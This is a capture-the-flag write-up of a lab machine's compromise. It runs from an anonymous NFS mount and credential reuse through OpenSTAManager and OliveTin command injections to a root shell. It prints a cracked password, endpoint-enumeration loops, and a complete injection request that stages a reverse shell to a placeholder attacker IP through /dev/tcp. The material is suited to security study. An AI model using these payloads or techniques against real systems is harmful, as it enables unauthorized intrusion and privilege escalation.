An anonymously-mountable NFS export at `/srv/nfs/onboarding` contains an HR onboarding PDF disclosing Roundcube webmail credentials for `kevin` on `mail001.enigma.htb`; his password is reused verbatim for `sarah`, whose inbox surfaces IT-issued OpenSTAManager admin credentials on a `support_001` subdomain. **OpenSTAManager v2.9.8** is vulnerable to **CVE-2025-69212** — a `decodeP7M()`-based authenticated command injection in the P7M file processing path — yielding a reverse shell as `www-data`; the application's `config.inc.php` leaks MySQL credentials, dumping `zz_users` gives a **bcrypt** (hashcat mode 3200) hash for `haris` that cracks to `bestfriends`, granting the user flag via `su haris`. Privilege escalation via a localhost-only **OliveTin v3000.10.0** instance vulnerable to **CVE-2026-27626**: the public PoCs target an API endpoint that doesn't exist in this version, so the actual endpoint (`StartActionAndWait`) is recovered by iterating candidates against HTTP status codes, and the protobuf field name (`actionId`) is extracted from the OliveTin binary itself with `strings`. OliveTin's `backup_database` action interpolates the `db_pass` argument into a `mysqldump -u X -p'Y' Z` shell command without escaping — a single-quote break-out plus a base64-staged Bash payload lands a root shell because OliveTin runs as root.

Browsing the apex returned an unremarkable marketing page — no login form, no application surface. The interesting protocol was NFS.

### NFS enumeration — the anonymously-mountable export

`showmount` queries the mountd RPC and returns the list of exports the server offers, including the client restrictions if any:

```bash
showmount -e enigma.htb
Export list for enigma.htb:
/srv/nfs/onboarding *
```

The `*` in the client column is the operative detail — it means the export is accessible from **any** client IP with no authentication. This is the least secure NFSv3 posture, and it's still the deployment default on many Linux distributions. Mounting the export from the attacker box:

```bash
mkdir nfs
sudo mount -t nfs 10.129.53.3:/srv/nfs/onboarding ./nfs
ls nfs/
New_Employee_Access.pdf
```

A single PDF titled `New_Employee_Access.pdf`. The name is self-explanatory: this is HR onboarding paperwork.

## Exploitation — CVE-2025-69212 (OpenSTAManager P7M Command Injection)

### Understanding the vulnerability

OpenSTAManager 2.9.8 ships with a file-processing module that handles **P7M** files — the container format for PKCS#7 SignedData messages, commonly used in Italian invoicing workflows. The `decodeP7M()` function is responsible for extracting the underlying XML from the signed envelope; internally it shells out to `openssl` to perform the actual PKCS#7 decoding, and it constructs that shell command with user-controlled filename components via PHP's `exec()` without proper escaping.

Any authenticated user with write access to a module that accepts P7M uploads can trigger the sink — the PoC handles the module and plugin discovery automatically. The end result is arbitrary command execution as the web-server user (`www-data`).

### Running the public PoC

The public exploit at [`github.com/BridgerAlderson/CVE-2025-69212-PoC`](https://github.com/BridgerAlderson/CVE-2025-69212-PoC) implements a two-phase flow: `--check` to detect the vulnerable module and confirm exploitability, then `--reverse-shell` to deliver the payload.

A dedicated `brollin` DB user with a password that reads like an operator-chosen phrase rather than machine-generated random. This is significant beyond the DB access itself — passwords with the shape *`Word@digits`* are the ones humans reuse.

### Cracking with hashcat mode 3200 — bcrypt

The `$2y$10$...` prefix is ambiguous by construction; several composite hash schemes share it. hashcat's autodetect enumerated the options:

```bash
hashcat hash.txt
The following 6 hash-modes match the structure of your input hash:

      # | Name                                                       | Category
  ======+============================================================+======================================
  25600 | bcrypt(md5($pass))                                         | Generic KDF
  25800 | bcrypt(sha1($pass))                                        | Generic KDF
  30600 | bcrypt(sha256($pass))                                      | Generic KDF
  28400 | bcrypt(sha512($pass))                                      | Generic KDF
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  33800 | WBB4 (Woltlab Burning Board) [bcrypt(bcrypt($pass))]       | Forums, CMS, E-Commerce
```

OpenSTAManager, despite the ambiguity of the prefix, uses **plain bcrypt** — mode **3200**, the "Operating System" category entry. The way to be sure without reading source is to test the candidates in priority order and let the successful crack confirm the scheme. Plain bcrypt is the highest-priority guess for any modern PHP framework that uses `password_hash()` with its default algorithm — the `PASSWORD_DEFAULT` constant has been `PASSWORD_BCRYPT` since PHP 5.5, and applications that don't explicitly opt into a composite scheme end up here.

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
[...]
$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC:bestfriends
[...]
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Recovered........: 1/2 (50.00%) Digests
```

`haris` : `bestfriends`. The password predictably worked against the OS account:

```bash

Password: bestfriends
haris@enigma:/var/www/html/openstamanager$ cat /home/haris/user.txt
```

## Privilege Escalation — `haris` → `root` (OliveTin CVE-2026-27626)

### Discovering the localhost-only OliveTin service

Enumeration as `haris` produced empty `sudo -l`, no SUID anomalies, no writable cron entries. The relevant lead came from listing listening sockets:

```bash
ss -tlnp
State   Local Address:Port    Peer Address:Port
LISTEN  127.0.0.1:33060       0.0.0.0:*
LISTEN  127.0.0.1:3306        0.0.0.0:*
LISTEN  127.0.0.1:1337        0.0.0.0:*
[...]
```

Port **1337** on loopback — non-standard, application-specific, and not exposed to the internet. Any localhost-only web service reachable by the current user is worth fingerprinting. A `curl` returned an HTML page identifying the application as **OliveTin**, a self-hosted web UI for triggering pre-defined shell scripts (marketed as a "safe" way to expose infrastructure actions to non-technical users).

Trying to launch a second instance of the OliveTin binary produced a useful error and, as a side-effect, printed the version banner:

```bash
haris@enigma:/opt/OliveTin/OliveTin-linux-amd64$ ./OliveTin
INFO OliveTin initializing  commit="d22bdeb" date="2026-02-14T20:41:10Z" version="3000.10.0"
[...]
FATA listen tcp 0.0.0.0:1337: bind: address already in use
```

**OliveTin v3000.10.0** is vulnerable to **CVE-2026-27626**, an unauthenticated command injection in the action-triggering API. The vulnerability is well documented; the public PoCs are straightforward. But there's a complication.

### The problem: public PoCs use an endpoint that doesn't exist

The public exploits target `POST /api/StartAction` with an action ID in the body. Trying that against the running instance returned a 404:

```bash
curl -s -o /dev/null -w "%{http_code}" -X POST http://localhost:1337/api/StartAction \
     -H "Content-Type: application/json" -d '{}'
404
```

The endpoint didn't exist in this build. The vulnerability is present; the entry point isn't where the PoC expects it. The API surface has to be discovered manually.

### Sub-step 3.1 — Enumerating the API by HTTP status code

The technique is straightforward: iterate a list of plausible endpoint names against the API, and read the HTTP status code as an oracle. **404 = doesn't exist**; **200 or 400 = exists** (200 means the endpoint accepted the empty body, 400 means it exists but complained about missing fields, both of which confirm the route). A quick shell loop:

```bash
for ep in init GetButtons GetDashboardComponents StartAction StartActionByGet \
          StartActionAndWait GetLogs WhoAmI GetReadyz DumpVars DumpPublicIdActionMap; do
  code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "http://localhost:1337/api/$ep" \
         -H "Content-Type: application/json" -d '{}')
  echo "$ep -> $code"
done
init                       -> 404
GetButtons                 -> 404
GetDashboardComponents     -> 404
StartAction                -> 404
StartActionByGet           -> 200
StartActionAndWait         -> 200
GetLogs                    -> 200
WhoAmI                     -> 200
GetReadyz                  -> 200
DumpVars                   -> 200
DumpPublicIdActionMap      -> 200
```

Six live endpoints. The relevant one for triggering actions in this API version is **`StartActionAndWait`**, not `StartAction`. The PoC's `StartAction` was likely renamed in a build refactor.

### Sub-step 3.2 — Recovering the field name from the binary with `strings`

Knowing the endpoint isn't enough — the request body needs the correct field name. OliveTin's documentation was ambiguous between `actionId` and `bindingId`, both of which appeared in various API examples with different meanings. The reliable source of truth is the binary itself: Go programs embed **protobuf field descriptors** as ASCII strings in the compiled binary, and `strings` extracts them verbatim.

```bash
strings /opt/OliveTin/OliveTin-linux-amd64/OliveTin 2>/dev/null | grep -iE "StartAction|bindingId|actionId"
[...]
ActionId ... protobuf:"bytes,1,opt,name=action_id,json=actionId,proto3" json:"action_id,omitempty"
[...]
```

The `json=actionId` tag in the protobuf descriptor is definitive: **the JSON field name for the action identifier is `actionId`**. `bindingId` exists too, but it belongs to a different request type. When documentation is ambiguous and PoCs don't work, **the binary doesn't lie** — the protobuf field names are literally compiled in.

### Sub-step 3.3 — Discovering the action ID empirically

The endpoint is `StartActionAndWait`, the field is `actionId`, but the *value* — the identifier of the specific action to trigger — is still unknown. The clean way to enumerate would be through the `DumpPublicIdActionMap` endpoint that surfaced in the earlier scan:

```bash
curl -s http://localhost:1337/api/DumpPublicIdActionMap -X POST \
     -H "Content-Type: application/json" -d '{}'
{"alert":"Dumping Public IDs is disallowed."}
```

Disabled by configuration. The alternative is to inspect the OliveTin configuration file, which lives in a predictable location:

```bash
cat /etc/OliveTin/config.yaml
[...]
  - title: Backup Database
    id: backup_database
    icon: "⛁"
    shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
    popupOnStart: execution-dialog
    arguments:
      - name: db_user
        type: ascii_identifier
        default: backup_svc
      - name: db_pass
        type: password
      - name: db_name
        type: ascii_identifier
        default: production
```

The **`id`** field — `backup_database` — is what `actionId` expects. And the `shell:` field is the entire vulnerability laid out: OliveTin interpolates the `db_pass` argument straight into a shell command line, inside a **single-quoted** context, with no escaping. Anything that closes the single quote is attacker-controlled.

### The command injection payload

The vulnerable template renders to:

```bash
mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql
```

The `{{ db_pass }}` interpolation happens **inside single quotes**. The classic injection is to break out of the single-quoted string by supplying a `'`, then chain a command with `;`, then comment out whatever comes after with `#`:

```
Injected db_pass: x'; <command>; #
```

Rendering that into the template produces:

```bash
mysqldump -u backup_svc -p'x'; <command>; #' production > /opt/backups/backup.sql
```

Bash parses this as three separate commands: the (failing) `mysqldump`, the injected command, and the (commented-out) tail.

The reverse-shell command itself is base64-staged. Encoding the payload avoids inner quote conflicts that would otherwise fight with the outer JSON encoding of the API request:

```bash
B64=$(echo 'bash -i >& /dev/tcp/<ATTACKER_IP>/4445 0>&1' | base64 -w0)
```

Netcat listener:

```bash
nc -nlvp 4445
Listening on 0.0.0.0 4445
```

And the crafted API request:

```bash
curl -s -X POST http://localhost:1337/api/StartActionAndWait \
  -H "Content-Type: application/json" \
  -d "{\"actionId\":\"backup_database\",\"arguments\":[
        {\"name\":\"db_user\",\"value\":\"backup_svc\"},
        {\"name\":\"db_pass\",\"value\":\"x'; echo $B64 | base64 -d | bash #\"},
        {\"name\":\"db_name\",\"value\":\"production\"}
      ]}"
```

The listener caught the callback as `root` — OliveTin runs under a systemd unit with `User=root`, so the injected command inherits full privileges:

```text
nc -nlvp 4445
Listening on 0.0.0.0 4445
Connection received on 10.129.53.3 57532
bash: cannot set terminal process group (62385): Inappropriate ioctl for device
bash: no job control in this shell
root@enigma:/# whoami
root
root@enigma:/# cat /root/root.txt
```

## Key Takeaways

- **Anonymously-accessible NFS exports are the modern-day open FTP share.** The default posture of NFSv3 is to trust the network for authentication — any client on the wire that can reach mountd can mount whatever the operator forgot to restrict. `showmount -e <target>` should be a reflex on any host with port 2049 open; the payoff when the export is world-readable is typically internal documentation, backups, or provisioning artefacts that were never meant to leave the trusted network.
- **HR onboarding paperwork is eternal credential exposure.** The `New_Employee_Access.pdf` document was structurally identical to what real IT departments produce for every new hire: system name, URL, provisional credentials, "please change on first login". Even when operators do change their passwords promptly, these PDFs get archived to file shares, emailed as attachments, printed and scanned back to disk, and generally leak in a hundred different directions. Their long-term threat model is essentially indefinite.
- **Password reuse across employees is a corporate-scale pattern.** IT departments issuing initial passwords tend to reuse a common seed value across cohorts of new hires — the classic `CompanyYear!` or `Welcome1`. Once the pattern is known, every enumerated user is a candidate for the same credential. Testing recovered passwords against every other known user in the tenant is the same discipline that pays off on OS-level credential reuse, just at the identity-layer instead of the system-layer.
- **Application `config.inc.php` files are the universal PHP-CMS credential dump.** OpenSTAManager stores DB credentials in `config.inc.php` at the application root; WordPress uses `wp-config.php`; Joomla uses `configuration.php`; Drupal uses `sites/default/settings.php`. Every PHP-based CMS has an equivalent file, always readable by the web-server user, always containing the DB credentials in plaintext. Any RCE against the web application immediately leaks these.
- **The `$2y$10$` bcrypt prefix is ambiguous — never assume plain bcrypt without confirming, and never assume the composite scheme without confirming either.** Six modes in hashcat share the `$2y$10$...` shape: plain bcrypt (mode 3200) plus the bcrypt-wrapping composites of MD5/SHA1/SHA256/SHA512 (25600/25800/30600/28400) and bcrypt-of-bcrypt (33800). Picking the wrong mode wastes hours because each attempt is a full bcrypt cost-10 operation per candidate. Always run hashcat's autodetect first (`hashcat hash.txt` with no `-m`) and try the candidates in priority order — plain bcrypt (3200) is the most common default for modern PHP frameworks that use `password_hash()` with `PASSWORD_DEFAULT`, while some older CMSes explicitly opt into composite schemes to work around bcrypt's 72-byte input limit.
- **When public PoCs don't work against the observed version, HTTP status codes are a viable enumeration primitive.** The absence of `StartAction` in this OliveTin build didn't mean the vulnerability was patched — the endpoint was simply renamed. Iterating a list of candidate endpoint names against the running instance and reading the HTTP status distinguishes "route exists" (200/400) from "route missing" (404) cheaply. This technique applies to any REST-shaped API where the documentation lags the code.
- **When documentation is ambiguous, the binary doesn't lie.** Go programs embed protobuf field descriptors as compiled-in strings; `strings <binary> | grep <field>` returns the exact JSON field names the API expects. The same technique works on any statically-linked binary with embedded schemas — Rust programs often embed clap definitions, Node.js bundled binaries embed argv parsers, and even C/C++ programs frequently leak configuration keys as string constants. `strings` should be a standard tool in every offensive workflow when the target is a compiled binary.
- **Error messages are an oracle for parameter discovery.** OliveTin's response of `"Dumping Public IDs is disallowed"` was informative even in refusing — it confirmed the endpoint existed. Requests with wrong `actionId` values returned `"notfound"`; requests with correct IDs but missing arguments returned specific `"required arg not provided: X"` errors. Each error message narrows the search space. The technique generalises to any API with structured error handling.
- **Interpolating user input into shell command strings is command injection, regardless of the templating layer that does the interpolation.** OliveTin's `shell:` config field with `{{ arg }}` interpolation is functionally identical to Bash's `$(...)` from an attacker's perspective — the fact that the substitution happens in Go code, before the shell sees the string, doesn't change the outcome. The fix at the design level is to never build shell commands from templated user input; the fix at the OliveTin level is to use `argv` arrays with individual arguments passed as literals to the executed process, without invoking a shell at all.
- **Services that expose infrastructure actions through templated shell commands are structurally suspicious.** OliveTin's entire value proposition is "let non-technical users trigger `mysqldump` and similar" — but the safety of that model depends entirely on whether the templated arguments can be broken out of. Any tool of this shape (OliveTin, some Ansible AWX configurations, self-hosted Jenkins declarations without proper sandbox) should be audited for whether user-supplied arguments end up quoted or escaped, and by what layer. If the shell does the parsing after the templating engine hands off the string, the templating engine's escape rules are irrelevant.
